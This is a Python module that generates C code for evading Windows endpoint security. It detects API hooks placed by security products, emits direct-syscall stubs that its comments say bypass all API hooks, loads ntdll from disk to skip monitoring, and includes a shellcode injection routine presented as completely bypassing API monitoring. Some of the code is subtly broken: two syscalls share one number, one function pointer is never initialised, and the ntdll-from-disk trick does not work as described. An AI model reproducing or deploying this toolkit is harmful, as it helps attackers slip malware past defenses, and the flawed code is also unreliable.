"""
Hook Detection & Syscall Extraction
Detect API hooks, extract clean syscalls, bypass monitored APIs
"""

import struct
import re
from pathlib import Path
import tempfile


class HookDetectionEngine:
    """Detect and bypass API hooks"""
    
    def __init__(self):
        self.hook_patterns = {
            'jmp': b'\xff\x25',      # JMP instruction
            'push_ret': b'\x68.*\xc3',  # PUSH + RET
            'mov_jmp': b'\x48\xc7.*\xff\xe0',  # MOV RAX + JMP
        }
    
    def detect_iat_hooks(self):
        """
        Detect Import Address Table (IAT) hooks
        Security products hook common APIs like:
        - CreateRemoteThread
        - WriteProcessMemory
        - LoadLibraryA/W
        """
        
        c_code = """
#include <windows.h>
#include <stdio.h>

typedef struct {
    const char* name;
    LPVOID real_address;
} API_INFO;

// Hook detection for common APIs
BOOL CheckForHooks() {
    API_INFO apis[] = {
        {"CreateRemoteThread", GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateRemoteThread")},
        {"WriteProcessMemory", GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory")},
        {"VirtualAllocEx", GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx")},
        {"CreateProcessA", GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA")},
        {"LoadLibraryA", GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")},
        {NULL, NULL}
    };
    
    for (int i = 0; apis[i].name; i++) {
        unsigned char* ptr = (unsigned char*)apis[i].real_address;
        
        // Check for common hook signatures
        // JMP instruction (0xFF 0x25)
        if (ptr[0] == 0xFF && ptr[1] == 0x25) {
            printf("[!] Hook detected on %s\\n", apis[i].name);
            return TRUE;
        }
        
        // PUSH + RET pattern (0x68 + 0xC3)
        if (ptr[0] == 0x68 && ptr[4] == 0xC3) {
            printf("[!] Hook detected on %s (PUSH/RET)\\n", apis[i].name);
            return TRUE;
        }
        
        // MOV RAX + JMP pattern (0x48 0xC7 ... 0xFF 0xE0)
        if (ptr[0] == 0x48 && ptr[1] == 0xC7 && ptr[9] == 0xFF && ptr[10] == 0xE0) {
            printf("[!] Hook detected on %s (MOV/JMP)\\n", apis[i].name);
            return TRUE;
        }
    }
    
    printf("[+] No obvious hooks detected\\n");
    return FALSE;
}

int main() {
    CheckForHooks();
    return 0;
}
"""
        return c_code
    
    def detect_eat_hooks(self):
        """
        Detect Export Address Table (EAT) hooks
        Hook ntdll.dll functions directly
        """
        
        c_code = """
#include <windows.h>
#include <stdio.h>

typedef struct {
    DWORD RVA;
    DWORD Size;
} EXPORT_TABLE;

BOOL CheckNtDllHooks() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    
    if (!hNtdll) return FALSE;
    
    // Get DOS header
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    
    // Get NT headers
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dos->e_lfanew);
    
    // Get export directory
    PIMAGE_EXPORT_DIRECTORY export_dir = 
        (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hNtdll + 
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    if (!export_dir) return FALSE;
    
    DWORD* address_table = (DWORD*)((DWORD_PTR)hNtdll + export_dir->AddressOfFunctions);
    DWORD* name_table = (DWORD*)((DWORD_PTR)hNtdll + export_dir->AddressOfNames);
    WORD* ordinal_table = (WORD*)((DWORD_PTR)hNtdll + export_dir->AddressOfNameOrdinals);
    
    printf("[*] Checking ntdll.dll EAT for hooks...\\n");
    
    for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
        const char* func_name = (const char*)((DWORD_PTR)hNtdll + name_table[i]);
        WORD ordinal = ordinal_table[i];
        DWORD rva = address_table[ordinal];
        unsigned char* func_ptr = (unsigned char*)((DWORD_PTR)hNtdll + rva);
        
        // Check for common hook patterns
        if (func_ptr[0] == 0xFF && func_ptr[1] == 0x25) {
            printf("[!] Hook on %s\\n", func_name);
            return TRUE;
        }
    }
    
    printf("[+] ntdll.dll appears unhooled\\n");
    return FALSE;
}

int main() {
    CheckNtDllHooks();
    return 0;
}
"""
        return c_code


class SyscallExtractor:
    """Extract and utilize direct syscalls"""
    
    def __init__(self):
        self.windows_syscalls = {
            'NtCreateProcess': 0x26,
            'NtCreateThread': 0x35,
            'NtCreateThreadEx': 0xd3,
            'NtOpenProcess': 0x26,
            'NtAllocateVirtualMemory': 0x18,
            'NtWriteVirtualMemory': 0x3a,
            'NtProtectVirtualMemory': 0x50,
            'NtSetInformationProcess': 0x88,
            'NtClose': 0x0f,
        }
    
    def generate_syscall_stub(self, syscall_name, architecture='x64'):
        """
        Generate direct syscall invocation
        Bypasses IAT/EAT hooks by calling into kernel directly
        
        x64 Windows calling convention:
        - RCX, RDX, R8, R9 = first 4 args
        - RAX = syscall number
        - SYSCALL instruction invokes kernel
        """
        
        if syscall_name not in self.windows_syscalls:
            raise ValueError(f"Unknown syscall: {syscall_name}")
        
        syscall_num = self.windows_syscalls[syscall_name]
        
        if architecture == 'x64':
            # x64 assembly
            c_code = f"""
// Direct syscall invocation - bypasses all API hooks
// Syscall: {syscall_name} (0x{syscall_num:02x})

__inline NTSTATUS {syscall_name}_DirectSyscall(
    // Parameters depend on specific syscall
    void* arg1,
    void* arg2,
    void* arg3
) {{
    __asm {{
        // Load syscall number into RAX
        mov rax, 0x{syscall_num:02x}
        
        // Arguments already in RCX, RDX, R8, R9
        mov rcx, qword ptr [arg1]
        mov rdx, qword ptr [arg2]
        mov r8,  qword ptr [arg3]
        
        // Call syscall
        syscall
        
        // RAX contains return value
    }}
}}

// Alternative: Using inline assembly function
NTSTATUS {syscall_name}_Syscall(void* arg1, void* arg2, void* arg3) {{
    __asm {{
        mov r10, rcx        ; Move first arg
        mov eax, 0x{syscall_num:02x}
        syscall
        ret
    }}
}}
"""
        else:  # x86
            c_code = f"""
// x86 direct syscall - NtCallbackReturn method
__declspec(naked) NTSTATUS {syscall_name}_DirectSyscall(void) {{
    __asm {{
        mov eax, 0x{syscall_num:02x}
        lea edx, [esp+4]
        int 0x2e
        ret
    }}
}}
"""
        
        return c_code
    
    def generate_syscall_chain(self, syscalls):
        """
        Generate optimized syscall chain for multiple operations
        Example: NtAllocateVirtualMemory -> NtWriteVirtualMemory -> NtProtectVirtualMemory
        """
        
        c_code = """
#include <windows.h>
#include <ntstatus.h>

// Define all needed syscalls
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PULONG NumberOfBytesToProtect,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Initialize syscall function pointers
void InitSyscalls(pNtAllocateVirtualMemory* pAlloc, pNtWriteVirtualMemory* pWrite) {
    *pAlloc = (pNtAllocateVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), 
        "NtAllocateVirtualMemory"
    );
    *pWrite = (pNtWriteVirtualMemory)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), 
        "NtWriteVirtualMemory"
    );
}

// Injection via syscalls - completely bypasses API monitoring
BOOL InjectViaDirectSyscalls(
    HANDLE hProcess,
    LPVOID lpShellcode,
    SIZE_T szShellcodeSize
) {
    NTSTATUS status;
    PVOID pBuffer = NULL;
    SIZE_T szBuffer = szShellcodeSize;
    ULONG dwOldProtect;
    
    // Get syscall functions
    pNtAllocateVirtualMemory pfnAlloc;
    pNtWriteVirtualMemory pfnWrite;
    pNtProtectVirtualMemory pfnProtect;
    
    InitSyscalls(&pfnAlloc, &pfnWrite);
    
    if (!pfnAlloc || !pfnWrite) return FALSE;
    
    // Allocate memory using syscall
    status = pfnAlloc(
        hProcess,
        &pBuffer,
        0,
        &szBuffer,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) return FALSE;
    
    // Write shellcode using syscall
    status = pfnWrite(
        hProcess,
        pBuffer,
        lpShellcode,
        (ULONG)szShellcodeSize,
        NULL
    );
    
    if (!NT_SUCCESS(status)) return FALSE;
    
    // Change protection to execute using syscall
    status = pfnProtect(
        hProcess,
        &pBuffer,
        (PULONG)&szBuffer,
        PAGE_EXECUTE_READ,
        &dwOldProtect
    );
    
    return NT_SUCCESS(status);
}

int main() {
    // Example usage
    DWORD dwPID = GetCurrentProcessId();
    HANDLE hProcess = GetCurrentProcess();
    
    unsigned char shellcode[] = {0x90, 0x90, 0x90}; // NOP sled for testing
    
    if (InjectViaDirectSyscalls(hProcess, shellcode, sizeof(shellcode))) {
        printf("[+] Injection successful using direct syscalls\\n");
    }
    
    return 0;
}
"""
        return c_code
    
    def get_syscall_numbers_windows_10_x64(self):
        """Syscall numbers for Windows 10 x64"""
        return self.windows_syscalls
    
    def generate_unhooled_ntdll(self):
        """
        Generate code to find unhooled ntdll.dll
        by mapping from disk instead of loaded module
        """
        
        c_code = """
#include <windows.h>
#include <stdio.h>

// Get ntdll.dll from disk (unhooled)
HMODULE GetUnhookedNtdll() {
    wchar_t ntdll_path[MAX_PATH];
    
    // Get Windows directory
    if (!GetWindowsDirectoryW(ntdll_path, MAX_PATH)) {
        return NULL;
    }
    
    wcscat_s(ntdll_path, MAX_PATH, L"\\\\System32\\\\ntdll.dll");
    
    // Load fresh copy from disk
    HMODULE hNtdll = LoadLibraryW(ntdll_path);
    
    if (!hNtdll) {
        printf("[!] Failed to load ntdll.dll from disk\\n");
        return NULL;
    }
    
    printf("[+] Loaded unhooled ntdll.dll from: %ls\\n", ntdll_path);
    
    return hNtdll;
}

// Get function pointer from unhooled ntdll
LPVOID GetUnhookedFunction(const char* function_name) {
    HMODULE hNtdll = GetUnhookedNtdll();
    
    if (!hNtdll) return NULL;
    
    LPVOID pFunc = GetProcAddress(hNtdll, function_name);
    
    // Important: Don't free the module, keep it loaded
    // FreeLibrary(hNtdll);
    
    return pFunc;
}

int main() {
    // Example: Get unhooled NtAllocateVirtualMemory
    LPVOID pNtAlloc = GetUnhookedFunction("NtAllocateVirtualMemory");
    
    if (pNtAlloc) {
        printf("[+] Got unhooled NtAllocateVirtualMemory at: 0x%p\\n", pNtAlloc);
    }
    
    return 0;
}
"""
        return c_code


class APIHookBypass:
    """Methods to bypass common API hooks"""
    
    def __init__(self):
        self.bypass_methods = {
            'direct_syscall': 'Call kernel directly, skip user-mode APIs',
            'ntdll_unhook': 'Load fresh ntdll.dll from disk',
            'inline_patch': 'Inline hook restoration by reading original bytes',
            'api_forwarding': 'Use alternate API that does same thing',
        }
    
    def get_bypass_strategies(self):
        """List all available hook bypass strategies"""
        return self.bypass_methods
